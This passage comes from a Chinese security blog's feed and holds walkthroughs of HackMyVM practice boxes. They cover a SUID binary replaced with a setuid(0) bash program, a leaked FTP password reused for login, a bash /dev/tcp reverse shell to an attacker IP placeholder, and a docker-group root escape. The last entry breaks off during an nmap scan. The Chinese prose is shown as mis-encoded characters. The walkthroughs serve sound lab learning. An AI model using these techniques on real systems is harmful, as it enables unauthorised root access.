<div class="highlight-wrap"autocomplete="off" autocorrect="off" autocapitalize="off" spellcheck="false" contenteditable="true"data-rel="ELIXIR"><figure class="iseeu highlight /elixir"><table><tr><td class="code"><pre><span class="line">suidy<span class="variable">@suidy</span><span class="symbol">:/home</span><span class="variable">$ </span>cd suidy/</span><br><span class="line">suidy<span class="variable">@suidy</span><span class="symbol">:/home/suidy</span><span class="variable">$ </span>ls</span><br><span class="line">note.txt  suidyyyyy</span><br><span class="line">suidy<span class="variable">@suidy</span><span class="symbol">:/home/suidy</span><span class="variable">$ </span>cat note.txt </span><br><span class="line">I love <span class="title class_">SUID</span> files!</span><br><span class="line"><span class="title class_">The</span> best file is suidyyyyy because users can <span class="keyword">use</span> it to feel as I feel.</span><br><span class="line">root know it <span class="keyword">and</span> run an script to be sure that my file has <span class="title class_">SUID</span>. </span><br><span class="line"><span class="title class_">If</span> you are <span class="string">&quot;theuser&quot;</span> I hate you!</span><br><span class="line"></span><br><span class="line">-suidy</span><br></pre></td></tr></table></figure></div>
<div class="highlight-wrap"autocomplete="off" autocorrect="off" autocapitalize="off" spellcheck="false" contenteditable="true"data-rel="ELIXIR"><figure class="iseeu highlight /elixir"><table><tr><td class="code"><pre><span class="line">suidy<span class="variable">@suidy</span><span class="symbol">:/home</span><span class="variable">$ </span>cd suidy/</span><br><span class="line">suidy<span class="variable">@suidy</span><span class="symbol">:/home/suidy</span><span class="variable">$ </span>ls</span><br><span class="line">note.txt  suidyyyyy</span><br><span class="line">suidy<span class="variable">@suidy</span><span class="symbol">:/home/suidy</span><span class="variable">$ </span>cat note.txt </span><br><span class="line">I love <span class="title class_">SUID</span> files!</span><br><span class="line"><span class="title class_">The</span> best file is suidyyyyy because users can <span class="keyword">use</span> it to feel as I feel.</span><br><span class="line">root know it <span class="keyword">and</span> run an script to be sure that my file has <span class="title class_">SUID</span>. </span><br><span class="line"><span class="title class_">If</span> you are <span class="string">&quot;theuser&quot;</span> I hate you!</span><br><span class="line"></span><br><span class="line">-suidy</span><br></pre></td></tr></table></figure></div>
<div class="highlight-wrap"autocomplete="off" autocorrect="off" autocapitalize="off" spellcheck="false" contenteditable="true"data-rel="APACHE"><figure class="iseeu highlight /apache"><table><tr><td class="code"><pre><span class="line"><span class="attribute">suidy</span>@suidy:/home/suidy$ file suidyyyyy </span><br><span class="line"><span class="attribute">suidyyyyy</span>: setuid, setgid ELF <span class="number">64</span>-bit LSB pie executable, x86-<span class="number">64</span>, version <span class="number">1</span> (SYSV), dynamically linked, interpreter /lib64/ld-linux-x86-<span class="number">64</span>.so.<span class="number">2</span>, for GNU/Linux <span class="number">3</span>.<span class="number">2</span>.<span class="number">0</span>, BuildID[sha1]=a68ca005dccaf529f434e0408b05dc8614758fb7, not stripped</span><br></pre></td></tr></table></figure></div>
<p>è¿™ä¸ªæ–‡ä»¶æ˜¯ä¸€ä¸ªå¯æ‰§è¡Œæ–‡ä»¶ï¼Œå¹¶ä¸”æœ‰æƒé™æ‰§è¡Œ,è€Œä¸”å‘ç°æ‰§è¡Œä¹‹åæˆ‘çš„ç”¨æˆ·å°±å˜æˆsuidyäº†<br>ä¸‹è½½åˆ°æœ¬åœ°çœ‹çœ‹</p>
<div class="highlight-wrap"autocomplete="off" autocorrect="off" autocapitalize="off" spellcheck="false" contenteditable="true"data-rel="LLVM"><figure class="iseeu highlight /llvm"><table><tr><td class="code"><pre><span class="line">â”Œâ”€â”€(rootã‰¿kakeru)-[~/tmp]</span><br><span class="line">â””â”€# scp theuser<span class="title">@192</span>.<span class="number">168.179</span>.<span class="number">169</span>:/home/suidy/suidyyyyy .</span><br><span class="line">theuser<span class="title">@192</span>.<span class="number">168.179</span>.<span class="number">169</span>&#x27;s password: </span><br><span class="line">suidyyyyy                                                                        <span class="number">100</span>%   <span class="number">16</span>KB   <span class="number">2.3</span>MB/s   <span class="number">00</span>:<span class="number">00</span>    </span><br><span class="line">                                                                                                                   </span><br><span class="line">â”Œâ”€â”€(rootã‰¿kakeru)-[~/tmp]</span><br><span class="line">â””â”€# strings suidyyyyy                                  </span><br><span class="line">/lib<span class="number">64</span>/ld-linux-<span class="keyword">x</span><span class="number">86</span><span class="number">-64</span>.so.<span class="number">2</span></span><br><span class="line">libc.so.<span class="number">6</span></span><br><span class="line">setuid</span><br><span class="line">system</span><br><span class="line">__cxa_finalize</span><br><span class="line">setgid</span><br><span class="line">__libc_start_main</span><br><span class="line">GLIBC_<span class="number">2.2</span>.<span class="number">5</span></span><br><span class="line">_ITM_deregisterTMCloneTable</span><br><span class="line">__gmon_start__</span><br><span class="line">_ITM_registerTMCloneTable</span><br><span class="line">u/UH</span><br><span class="line">[]A\A]A^A_</span><br><span class="line">/bin/bash</span><br><span class="line"><span class="comment">;*3$&quot;</span></span><br><span class="line">GCC: (Debian <span class="number">8.3</span>.<span class="number">0</span><span class="number">-6</span>) <span class="number">8.3</span>.<span class="number">0</span></span><br><span class="line">crtstuff.<span class="keyword">c</span></span><br><span class="line">deregister_tm_clones</span><br><span class="line">__do_global_dtors_aux</span><br><span class="line">completed.<span class="number">7325</span></span><br><span class="line">__do_global_dtors_aux_fini_array_entry</span><br><span class="line">frame_dummy</span><br><span class="line">__frame_dummy_init_array_entry</span><br><span class="line">__FRAME_END__</span><br><span class="line">__init_array_end</span><br><span class="line">_DYNAMIC</span><br><span class="line">__init_array_start</span><br><span class="line">__GNU_EH_FRAME_HDR</span><br><span class="line">_GLOBAL_OFFSET_TABLE_</span><br><span class="line">__libc_csu_fini</span><br><span class="line">_ITM_deregisterTMCloneTable</span><br><span class="line">_edata</span><br><span class="line">system@<span class="title">@GLIBC_2.2.5</span></span><br><span class="line">__libc_start_main@<span class="title">@GLIBC_2.2.5</span></span><br><span class="line">__data_start</span><br><span class="line">__gmon_start__</span><br><span class="line">__dso_handle</span><br><span class="line">_IO_stdin_used</span><br><span class="line">__libc_csu_init</span><br><span class="line">__bss_start</span><br><span class="line">main</span><br><span class="line">setgid@<span class="title">@GLIBC_2.2.5</span></span><br><span class="line">__TMC_END__</span><br><span class="line">_ITM_registerTMCloneTable</span><br><span class="line">setuid@<span class="title">@GLIBC_2.2.5</span></span><br><span class="line">__cxa_finalize@<span class="title">@GLIBC_2.2.5</span></span><br><span class="line">.symtab</span><br><span class="line">.strtab</span><br><span class="line">.shstrtab</span><br><span class="line">.interp</span><br><span class="line">.note.ABI-tag</span><br><span class="line">.note.gnu.build-id</span><br><span class="line">.gnu.hash</span><br><span class="line">.dynsym</span><br><span class="line">.dynstr</span><br><span class="line">.gnu.version</span><br><span class="line">.gnu.version_r</span><br><span class="line">.rela.dyn</span><br><span class="line">.rela.plt</span><br><span class="line">.init</span><br><span class="line">.plt.got</span><br><span class="line">.text</span><br><span class="line">.fini</span><br><span class="line">.rodata</span><br><span class="line">.eh_frame_hdr</span><br><span class="line">.eh_frame</span><br><span class="line">.init_array</span><br><span class="line">.fini_array</span><br><span class="line">.dynamic</span><br><span class="line">.got.plt</span><br><span class="line">.data</span><br><span class="line">.bss</span><br><span class="line">.**comment**</span><br></pre></td></tr></table></figure></div>
<p>è¿™é‡Œé¢æœ‰&#x2F;bin&#x2F;bash,çŒœæµ‹æ‰§è¡Œä¹‹åå°±æ˜¯ç»™ä¸€ä¸ªç»ˆç«¯ï¼Œä¸‹è½½æœ¬åœ°ï¼Œç”¨idaçœ‹çœ‹å…·ä½“é€»è¾‘</p>
<div class="highlight-wrap"autocomplete="off" autocorrect="off" autocapitalize="off" spellcheck="false" contenteditable="true"data-rel="ARDUINO"><figure class="iseeu highlight /arduino"><table><tr><td class="code"><pre><span class="line"><span class="function"><span class="type">int</span> __fastcall <span class="title">main</span><span class="params">(<span class="type">int</span> argc, <span class="type">const</span> <span class="type">char</span> **argv, <span class="type">const</span> <span class="type">char</span> **envp)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">  <span class="built_in">setuid</span>(<span class="number">0x3E9u</span>);</span><br><span class="line">  <span class="built_in">setgid</span>(<span class="number">0x3E9u</span>);</span><br><span class="line">  <span class="built_in">system</span>(<span class="string">&quot;/bin/bash&quot;</span>);</span><br><span class="line">  <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></div>
<p>è¿™é‡Œè®¾ç½®äº†ä¸€ä¸ªsuidç„¶åæ‰§è¡Œ&#x2F;bin&#x2F;bashï¼Œå¦‚æœèƒ½æ”¹è¿™ä¸ªsetsuidå°±å¯ä»¥äº†ï¼Œæ”¹æˆ0å°±æ˜¯rootçš„shelläº†<br>æ‰€ä»¥å°è¯•åˆ›å»ºä¸€ä¸ªæ–‡ä»¶ã€‚ç”¨ç›¸åŒçš„é€»è¾‘ï¼Œæ›¿æ¢æ‰è¿™ä¸ªæ–‡ä»¶ï¼Œæ‰§è¡Œ</p>
<div class="highlight-wrap"autocomplete="off" autocorrect="off" autocapitalize="off" spellcheck="false" contenteditable="true"data-rel="RUBY"><figure class="iseeu highlight /ruby"><table><tr><td class="code"><pre><span class="line">suidy<span class="variable">@suidy</span><span class="symbol">:/home/suidy</span><span class="variable">$ </span>wget <span class="number">192.168</span>.<span class="number">179.83</span>/tmp.c</span><br><span class="line">--<span class="number">2025</span>-<span class="number">02</span>-09 <span class="number">05</span><span class="symbol">:</span><span class="number">03</span><span class="symbol">:</span><span class="number">33</span>--  <span class="symbol">http:</span>/<span class="regexp">/192.168.179.83/tmp</span>.c</span><br><span class="line"><span class="title class_">Connecting</span> to <span class="number">192.168</span>.<span class="number">179.83</span><span class="symbol">:</span><span class="number">80</span>... connected.</span><br><span class="line"><span class="variable constant_">HTTP</span> request sent, awaiting response... <span class="number">200</span> <span class="variable constant_">OK</span></span><br><span class="line"><span class="title class_">Length</span>: <span class="number">122</span> [text/x-csrc]</span><br><span class="line"><span class="title class_">Saving</span> <span class="symbol">to:</span> <span class="string">&#x27;tmp.c&#x27;</span></span><br><span class="line"></span><br><span class="line">tmp.c                        <span class="number">100</span><span class="string">%[=============================================&gt;]</span>     <span class="number">122</span>  --.-<span class="variable constant_">KB</span>/s    <span class="keyword">in</span> 0s      </span><br><span class="line"></span><br><span class="line"><span class="number">2025</span>-<span class="number">02</span>-09 <span class="number">05</span><span class="symbol">:</span><span class="number">03</span><span class="symbol">:</span><span class="number">33</span> (<span class="number">1.31</span> <span class="variable constant_">MB</span>/s) - <span class="string">&#x27;tmp.c&#x27;</span> saved [<span class="number">122</span>/<span class="number">122</span>]</span><br><span class="line"></span><br><span class="line">suidy<span class="variable">@suidy</span><span class="symbol">:/home/suidy</span><span class="variable">$ </span>chmod +x tmp.c</span><br><span class="line">suidy<span class="variable">@suidy</span><span class="symbol">:/home/suidy</span><span class="variable">$ </span>cat tmp.c</span><br><span class="line"><span class="comment">#include &lt;stdio.h&gt;</span></span><br><span class="line"><span class="comment">#include &lt;unistd.h&gt;</span></span><br><span class="line">int main()&#123;</span><br><span class="line">    setuid(<span class="number">0</span>);</span><br><span class="line">    setgid(<span class="number">0</span>);</span><br><span class="line">    system(<span class="string">&quot;/bin/bash&quot;</span>);</span><br><span class="line">    <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br><span class="line">suidy<span class="variable">@suidy</span><span class="symbol">:/home/suidy</span><span class="variable">$ </span>gcc tmp.c -o a</span><br></pre></td></tr></table></figure></div>
<p>ä½†æ˜¯ç›´æ¥mvæç¤ºè¿›ç¨‹åœ¨å ç”¨ï¼Œå› ä¸ºä¹‹å‰è¿è¡Œè¿‡äº†suidyyyyyè¿™ä¸ªæ–‡ä»¶ï¼Œç„¶ååœ¨äº†suidyè¿™ä¸ªç”¨æˆ·çš„bashä¸­<br>æ‰€ä»¥è®¾ç½®ä¸€ä¸‹ä¸¤ä¸ªæ–‡ä»¶çš„æƒé™<br>é€€å‡ºåˆ°theuserç„¶åå†æ›¿æ¢</p>
<div class="highlight-wrap"autocomplete="off" autocorrect="off" autocapitalize="off" spellcheck="false" contenteditable="true"data-rel="ELIXIR"><figure class="iseeu highlight /elixir"><table><tr><td class="code"><pre><span class="line">suidy<span class="variable">@suidy</span><span class="symbol">:/home/suidy</span><span class="variable">$ </span>chmod <span class="number">777</span> a</span><br><span class="line">suidy<span class="variable">@suidy</span><span class="symbol">:/home/suidy</span><span class="variable">$ </span>cp a /tmp</span><br><span class="line">suidy<span class="variable">@suidy</span><span class="symbol">:/home/suidy</span><span class="variable">$ </span>mv a suidyyyyy</span><br><span class="line">theuser<span class="variable">@suidy</span><span class="symbol">:/tmp</span><span class="variable">$ </span>cp suidyyyyy /home/suidy/suidyyyyy</span><br><span class="line">theuser<span class="variable">@suidy</span><span class="symbol">:/tmp</span><span class="variable">$ </span>cd /home/suidy</span><br><span class="line">theuser<span class="variable">@suidy</span><span class="symbol">:/home/suidy</span><span class="variable">$ </span>./suidyyyyy </span><br><span class="line"><span class="symbol">bash:</span> <span class="symbol">warning:</span> <span class="symbol">setlocale:</span> <span class="symbol">LC_ALL:</span> cannot change locale (en_US.<span class="title class_">UTF</span><span class="number">-8</span>)</span><br><span class="line">theuser<span class="variable">@suidy</span><span class="symbol">:/home/suidy</span><span class="variable">$ </span>ls</span><br><span class="line">a  a.c  note.txt  pspy64  suidyyyyy  tmp.c</span><br><span class="line">theuser<span class="variable">@suidy</span><span class="symbol">:/home/suidy</span><span class="variable">$ </span>ls -al</span><br><span class="line">total <span class="number">3108</span></span><br><span class="line">drwxr-xr-x <span class="number">3</span> suidy suidy      <span class="number">4096</span> <span class="title class_">Feb</span>  <span class="number">9</span> <span class="number">05</span><span class="symbol">:</span><span class="number">04</span> .</span><br><span class="line">drwxr-xr-x <span class="number">4</span> root  root       <span class="number">4096</span> <span class="title class_">Sep</span> <span class="number">26</span>  <span class="number">2020</span> ..</span><br><span class="line">-rw------- <span class="number">1</span> suidy suidy        <span class="number">12</span> <span class="title class_">Sep</span> <span class="number">27</span>  <span class="number">2020</span> .bash_history</span><br><span class="line">-rw-r--r-- <span class="number">1</span> suidy suidy       <span class="number">220</span> <span class="title class_">Sep</span> <span class="number">26</span>  <span class="number">2020</span> .bash_logout</span><br><span class="line">-rw-r--r-- <span class="number">1</span> suidy suidy      <span class="number">3526</span> <span class="title class_">Sep</span> <span class="number">26</span>  <span class="number">2020</span> .bashrc</span><br><span class="line">drwxr-xr-x <span class="number">3</span> suidy suidy      <span class="number">4096</span> <span class="title class_">Sep</span> <span class="number">26</span>  <span class="number">2020</span> .local</span><br><span class="line">-rw-r--r-- <span class="number">1</span> suidy suidy       <span class="number">807</span> <span class="title class_">Sep</span> <span class="number">26</span>  <span class="number">2020</span> .profile</span><br><span class="line">-rwxrwxrwx <span class="number">1</span> suidy theuser   <span class="number">16712</span> <span class="title class_">Feb</span>  <span class="number">9</span> <span class="number">05</span><span class="symbol">:</span><span class="number">04</span> a</span><br><span class="line">-rw-r--r-- <span class="number">1</span> suidy theuser       <span class="number">0</span> <span class="title class_">Feb</span>  <span class="number">9</span> <span class="number">05</span><span class="symbol">:</span><span class="number">00</span> a.c</span><br><span class="line">-r--r----- <span class="number">1</span> suidy suidy       <span class="number">197</span> <span class="title class_">Sep</span> <span class="number">26</span>  <span class="number">2020</span> note.txt</span><br><span class="line">-rwxr-xr-x <span class="number">1</span> suidy theuser <span class="number">3104768</span> <span class="title class_">Feb</span>  <span class="number">5</span> <span class="number">11</span><span class="symbol">:</span><span class="number">11</span> pspy64</span><br><span class="line">-rwsrwsr-x <span class="number">1</span> root  theuser   <span class="number">16712</span> <span class="title class_">Feb</span>  <span class="number">9</span> <span class="number">05</span><span class="symbol">:</span><span class="number">14</span> suidyyyyy</span><br><span class="line">-rwxr-xr-x <span class="number">1</span> suidy theuser     <span class="number">122</span> <span class="title class_">Feb</span>  <span class="number">9</span> <span class="number">05</span><span class="symbol">:</span><span class="number">03</span> tmp.c</span><br><span class="line">theuser<span class="variable">@suidy</span><span class="symbol">:/home/suidy</span><span class="variable">$ </span>./suidyyyyy</span><br><span class="line">root<span class="variable">@suidy</span><span class="symbol">:/home/suidy</span><span class="comment"># cd /root   </span></span><br><span class="line">root<span class="variable">@suidy</span><span class="symbol">:/root</span><span class="comment"># ls</span></span><br><span class="line">root.txt  timer.sh</span><br><span class="line">root<span class="variable">@suidy</span><span class="symbol">:/root</span><span class="comment"># </span></span><br></pre></td></tr></table></figure></div>
<p>ç»“æŸ</p>
<p>æ€»ç»“ï¼šæœ‰ç‚¹æ„æ€çš„åªæœ‰ææƒè¿™è¾¹ï¼Œå¯¹æœ‰suidçš„ç¨‹åºè¿›è¡Œåˆ†æï¼Œç„¶åä¿®æ”¹suidçš„å€¼æ›¿æ¢åŸæ–‡ä»¶</p>
]]></content>
      <categories>
        <category>é¶åœº</category>
        <category>hmv</category>
      </categories>
      <tags>
        <tag>æ¸—é€</tag>
        <tag>HMV</tag>
        <tag>é¶åœº</tag>
      </tags>
  </entry>
  <entry>
    <title>HMV-Pwned</title>
    <url>/posts/3123.html</url>
    <content><![CDATA[<p>HMV-Pwnedé¶åœºå¤ç›˜</p>
<span id="more"></span>
<p><img src="https://pic1.imgdb.cn/item/679a35f3d0e0a243d4f878cc.png"></p>
<h1 id="Pwned"><a href="#Pwned" class="headerlink" title="Pwned"></a>Pwned</h1><h2 id="ç«¯å£æ¢æµ‹"><a href="#ç«¯å£æ¢æµ‹" class="headerlink" title="ç«¯å£æ¢æµ‹"></a>ç«¯å£æ¢æµ‹</h2><p><img src="https://pic1.imgdb.cn/item/679a3c54d0e0a243d4f879d6.png" alt="|275"><br>å¼€æ”¾äº†ä¸‰ä¸ªç«¯å£ ftp ssh  http  </p>
<h2 id="webæ¢æµ‹"><a href="#webæ¢æµ‹" class="headerlink" title="webæ¢æµ‹"></a>webæ¢æµ‹</h2><p>è®¿é—®80ç«¯å£ ç½‘é¡µä¸­åªæœ‰ä¸€å¥è¯å’Œä¸€ä¸ªæ³¨é‡Š<br><img src="https://pic1.imgdb.cn/item/679a3c55d0e0a243d4f879d7.png"><br><img src="https://pic1.imgdb.cn/item/679a3c58d0e0a243d4f879d8.png" alt="|450"><br>è¯´æ˜å‘˜å·¥é‡Œé¢æœ‰ä¸€ä¸ªå¥³æ€§<br>ç„¶åç”¨dirsearchè·‘ä¸€é   å‘ç°ä¹‹åä¸€ä¸ªnothingç›®å½•  nothingé‡Œé¢ç¡®å®æ˜¯nothingğŸ˜‚<br>è¿™é‡Œæ²¡æœ‰å¯ä»¥æ³¨å…¥çš„ç‚¹  ä¹Ÿæ²¡æœ‰æ‰¾åˆ°å¯ä»¥è¿›å…¥çš„ç›®å½•   æ²¡æœ‰ä»»ä½•çš„æ–¹å‘äº† è¯´æ˜ä¸€å®šæ˜¯ä¿¡æ¯æ”¶é›†ä¸å¤Ÿ<br>ç”¨gobusterå†è·‘ä¸€é   <code>gobuster dir -u 192.168.240.74 -w /usr/share/wordlists/dirbuster/directory-list-lowercase-2.3-medium.txt -t 60</code><br>å‘ç°äº†æ–°çš„ç›®å½•  &#x2F;hidden_text<br><img src="https://pic1.imgdb.cn/item/679a3c59d0e0a243d4f879d9.png"><br>æ‰¾åˆ°ä¸€ä¸ªæ–‡ä»¶  é‡Œé¢åˆæ˜¯ä¸€äº›ç›®å½•çš„å­—å…¸ ç°åœ¨å†ç”¨dirsearchè·‘ä¸€é     ç„¶åè¿›å…¥é‚£ä¸ªå¯ä»¥è®¿é—®çš„ç•Œé¢<br><img src="https://pic1.imgdb.cn/item/679a3c59d0e0a243d4f879da.png" alt="|375"><br><img src="https://pic1.imgdb.cn/item/679a3c89d0e0a243d4f879e3.png"><br>è¿›å…¥åæœ‰ä¸€ä¸ªç™»å½•ç•Œé¢  ä½†æ˜¯æ²¡æœ‰å¯ä»¥æ³¨å…¥çš„ç‚¹<br><img src="https://pic1.imgdb.cn/item/679a3c8ad0e0a243d4f879e4.png" alt="|500"><br>å‘ç°æœ‰ä¸€ä¸ªæ³¨é‡Š  æ³¨é‡Šé‡Œé¢æœ‰æœ‰ç”¨æˆ·åftpuser å¯†ç  B0ss_B!TcH  æ‰€ä»¥å¯ä»¥ç™»å½•ftp è¿˜èƒ½ç™»å½•ssh</p>
<h2 id="ææƒ"><a href="#ææƒ" class="headerlink" title="ææƒ"></a>ææƒ</h2><p><img src="https://pic1.imgdb.cn/item/679a3c8cd0e0a243d4f879e5.png" alt="|375"><br>è¿›å…¥è¿™ä¸ªshellä¹‹åå‘ç°é‡Œé¢æœ‰ä¸¤ä¸ªæ–‡ä»¶  ä¸€ä¸ªæ˜¯rsaçš„ç§é’¥  ç„¶åå‘Šè¯‰äº†æˆ‘ä»¬ä¸€ä¸ªç”¨æˆ·ariana<br>ç°åœ¨å°±ç”¨è¿™ä¸ªç§é’¥è¿›å…¥è¿™ä¸ªç”¨æˆ·  åœ¨ç™»å½•ä¹‹å‰è¦å…ˆchmod 600<br>æ‹¿åˆ°arianaçš„shell<br><img src="https://pic1.imgdb.cn/item/679a3c8dd0e0a243d4f879e6.png"><br>æ‰¾åˆ°äº†å¦å¤–ä¸€ä¸ªç”¨æˆ·selena<br><img src="https://pic1.imgdb.cn/item/679a3c8dd0e0a243d4f879e7.png"><br>sudo -l å‘ç°å¯ä»¥æ‰§è¡Œä¸€ä¸ªè„šæœ¬<br><img src="https://pic1.imgdb.cn/item/679a3cb8d0e0a243d4f879ee.png"><br>è„šæœ¬ä¸­çš„å†…å®¹ä¸ºï¼š<br><img src="https://pic1.imgdb.cn/item/679a3cbad0e0a243d4f879ef.png" alt="|650"><br>è¿™ä¸ªè„šæœ¬ä¼šecho $msg å°±æ˜¯ä½ å†™å…¥çš„æ¶ˆæ¯ä¼šè¢«æ‰“å‡ºæ¥  æ‰€ä»¥æˆ‘ä»¬å¯ä»¥ç”¨selenaèº«ä»½æ‰§è¡Œè„šæœ¬  ç„¶åå¾—åˆ°bash<br>è¿™é‡Œnc æ²¡æœ‰-eæŒ‡ä»¤ å­¦ä¹ ä¸€ç§æ–°çš„åå¼¹shellæ–¹å¼<br><code>bash -i &gt;&amp;/dev/tcp/ æ”»å‡»æœº_IP / æ”»å‡»æœºç«¯å£ 0&gt;&amp;1</code>  <a href="https://blog.csdn.net/qq_64177395/article/details/143491556">åå¼¹shell</a><br>è¿™é‡Œæˆ‘ä»¬ç›´æ¥å‘bashå¾—åˆ°selena çš„ shell<br><img src="https://pic1.imgdb.cn/item/679a3cbad0e0a243d4f879f0.png"><br>å‘ç°idåœ¨dockerç»„ è¦ç”¨dockerææƒ<br><code>docker run -v /:/mnt --rm -it alpine chroot /mnt sh</code></p>
<h2 id="dockerææƒå‘½ä»¤è¯¦ç»†è§£é‡Š"><a href="#dockerææƒå‘½ä»¤è¯¦ç»†è§£é‡Š" class="headerlink" title="dockerææƒå‘½ä»¤è¯¦ç»†è§£é‡Š"></a>dockerææƒå‘½ä»¤è¯¦ç»†è§£é‡Š</h2><h4 id="1-docker-run"><a href="#1-docker-run" class="headerlink" title="1. docker run"></a>1. <code>docker run</code></h4><p>è¿™æ˜¯ Docker å‘½ä»¤ï¼Œç”¨äºå¯åŠ¨ä¸€ä¸ªæ–°çš„å®¹å™¨å¹¶è¿è¡ŒæŒ‡å®šçš„å‘½ä»¤ã€‚</p>
<h4 id="2-v-mnt"><a href="#2-v-mnt" class="headerlink" title="2. -v /:/mnt"></a>2. <code>-v /:/mnt</code></h4><ul>
<li><code>-v</code> æ˜¯ Docker çš„å·æŒ‚è½½é€‰é¡¹ï¼Œç”¨äºå°†å®¿ä¸»æœºçš„æ–‡ä»¶ç³»ç»ŸæŒ‚è½½åˆ°å®¹å™¨ä¸­ã€‚</li>
<li><code>/</code> è¡¨ç¤ºå®¿ä¸»æœºçš„æ ¹æ–‡ä»¶ç³»ç»Ÿã€‚</li>
<li><code>/mnt</code> æ˜¯å®¹å™¨å†…éƒ¨çš„æŒ‚è½½ç‚¹ã€‚</li>
</ul>
<p>æ‰€ä»¥ï¼Œ<code>-v /:/mnt</code> è¿™éƒ¨åˆ†å‘½ä»¤çš„ä½œç”¨æ˜¯å°†å®¿ä¸»æœºçš„æ ¹æ–‡ä»¶ç³»ç»Ÿ <code>/</code> æŒ‚è½½åˆ°å®¹å™¨å†…éƒ¨çš„ <code>/mnt</code> ç›®å½•ã€‚</p>
<h4 id="3-rm"><a href="#3-rm" class="headerlink" title="3. --rm"></a>3. <code>--rm</code></h4><ul>
<li><code>--rm</code> è¡¨ç¤ºåœ¨å®¹å™¨åœæ­¢åè‡ªåŠ¨åˆ é™¤å®¹å™¨ã€‚è¿™ä½¿å¾—å®¹å™¨åœ¨é€€å‡ºåä¸ä¼šåœ¨ Docker ä¸»æœºä¸Šç•™ä¸‹æ®‹ä½™æ–‡ä»¶ã€‚</li>
</ul>
<h4 id="4-it"><a href="#4-it" class="headerlink" title="4. -it"></a>4. <code>-it</code></h4><ul>
<li><code>-i</code>ï¼šä¿æŒå®¹å™¨çš„æ ‡å‡†è¾“å…¥æ‰“å¼€ï¼ˆäº¤äº’å¼æ¨¡å¼ï¼‰ã€‚</li>
<li><code>-t</code>ï¼šä¸ºå®¹å™¨åˆ†é…ä¸€ä¸ªä¼ªç»ˆç«¯ï¼Œè¿™æ ·å¯ä»¥è¿›è¡Œäº¤äº’å¼æ“ä½œã€‚</li>
</ul>
<p>è¿™ä¸¤ä¸ªé€‰é¡¹ç»„åˆèµ·æ¥æ„å‘³ç€å®¹å™¨å°†ä»¥äº¤äº’å¼æ¨¡å¼è¿è¡Œï¼Œå…è®¸ç”¨æˆ·åœ¨å®¹å™¨å†…æ‰§è¡Œå‘½ä»¤ã€‚</p>
<h4 id="5-alpine"><a href="#5-alpine" class="headerlink" title="5. alpine"></a>5. <code>alpine</code></h4><ul>
<li>è¿™æ˜¯ä¸€ä¸ªå°å‹çš„ Linux å‘è¡Œç‰ˆé•œåƒï¼Œé€šå¸¸ç”¨äºæ„å»ºè½»é‡çº§çš„ Docker å®¹å™¨ã€‚å®ƒåŒ…å«æœ€åŸºæœ¬çš„å·¥å…·å’Œåº“ï¼Œéå¸¸é€‚åˆç”¨ä½œåŸºç¡€é•œåƒã€‚</li>
</ul>
<h4 id="6-chroot-mnt"><a href="#6-chroot-mnt" class="headerlink" title="6. chroot /mnt"></a>6. <code>chroot /mnt</code></h4><ul>
<li><code>chroot</code> æ˜¯ Linux ä¸­çš„ä¸€ä¸ªå‘½ä»¤ï¼Œç”¨äºæ”¹å˜å½“å‰è¿›ç¨‹çš„æ ¹ç›®å½•ã€‚æ‰§è¡Œ <code>chroot /mnt</code> åï¼Œå®¹å™¨å†…çš„æ–‡ä»¶ç³»ç»Ÿæ ¹ç›®å½•å˜æˆäº† <code>/mnt</code>ï¼Œè€Œ <code>mnt</code> è¢«æŒ‚è½½åˆ°äº†å®¿ä¸»æœºçš„æ ¹æ–‡ä»¶ç³»ç»Ÿ <code>/</code>ã€‚</li>
<li>è¿™æ„å‘³ç€ï¼Œå®¹å™¨å†…çš„ç¨‹åºå’Œå‘½ä»¤å°†è®¤ä¸º <code>/mnt</code> æ˜¯æ–‡ä»¶ç³»ç»Ÿçš„æ ¹ç›®å½•ã€‚ç”±äº <code>/mnt</code> æ˜ å°„äº†å®¿ä¸»æœºçš„æ ¹æ–‡ä»¶ç³»ç»Ÿï¼Œè¿™å®é™…ä¸Šä½¿å¾—å®¹å™¨å†…éƒ¨çš„è¿›ç¨‹è¿›å…¥äº†å®¿ä¸»æœºçš„æ–‡ä»¶ç³»ç»Ÿç¯å¢ƒã€‚</li>
</ul>
<h4 id="7-sh"><a href="#7-sh" class="headerlink" title="7. sh"></a>7. <code>sh</code></h4><ul>
<li><code>sh</code> æ˜¯åœ¨å®¹å™¨ä¸­æ‰§è¡Œçš„å‘½ä»¤ï¼Œå®ƒå¯åŠ¨ä¸€ä¸ª shellï¼ˆå³ <code>sh</code>ï¼‰ï¼Œå…è®¸ä½ åœ¨å®¹å™¨å†…ä¸å®¿ä¸»æœºçš„æ ¹æ–‡ä»¶ç³»ç»Ÿäº¤äº’ã€‚</li>
</ul>
]]></content>
      <categories>
        <category>é¶åœº</category>
        <category>hmv</category>
      </categories>
      <tags>
        <tag>æ¸—é€</tag>
        <tag>HMV</tag>
        <tag>é¶åœº</tag>
      </tags>
  </entry>
  <entry>
    <title>ç¾¤å‹é¶æœº-LingMjå¤ç›˜</title>
    <url>/posts/51954.html</url>
    <content><![CDATA[<p>ç¾¤å‹é¶æœº-LingMjå¤ç›˜</p>
<span id="more"></span>
<h1 id="ç«¯å£æ‰«æ"><a href="#ç«¯å£æ‰«æ" class="headerlink" title="ç«¯å£æ‰«æ"></a>ç«¯å£æ‰«æ</h1><div class="highlight-wrap"autocomplete="off" autocorrect="off" autocapitalize="off" spellcheck="false" contenteditable="true"data-rel="LIVECODESERVER"><figure class="iseeu highlight /livecodeserver"><table><tr><td class="code"><pre><span class="line">â”€â”€(rootã‰¿kakeru)-[~/tmp]</span><br><span class="line">â””â”€<span class="comment"># nmap 192.168.176.228 -p- </span></span><br><span class="line">Starting Nmap <span class="number">7.95</span> ( <span class="keyword">https</span>://nmap.org ) <span class="keyword">at</span> <span class="number">2025</span><span class="number">-05</span><span class="number">-06</span> <span class="number">23</span>:<span class="number">05</span> CST</span><br><span class="line">Nmap scan report <span class="keyword">for</span> bogon (<span class="number">192.168</span><span class="number">.176</span><span class="number">.228</span>)</span><br><span class="line">Host is up (<span class="number">0.0081</span>s latency).</span><br><span class="line">Not shown: <span class="number">65532</span> closed tcp ports (reset)</span><br><span class="line">PORT     STATE SERVICE</span><br><span class="line"><span class="number">22</span>/tcp   <span class="built_in">open</span>  ssh</span><br><span class="line"><span class="number">80</span>/tcp   <span class="built_in">open</span>  <span class="keyword">http</span></span><br><span class="line"><span 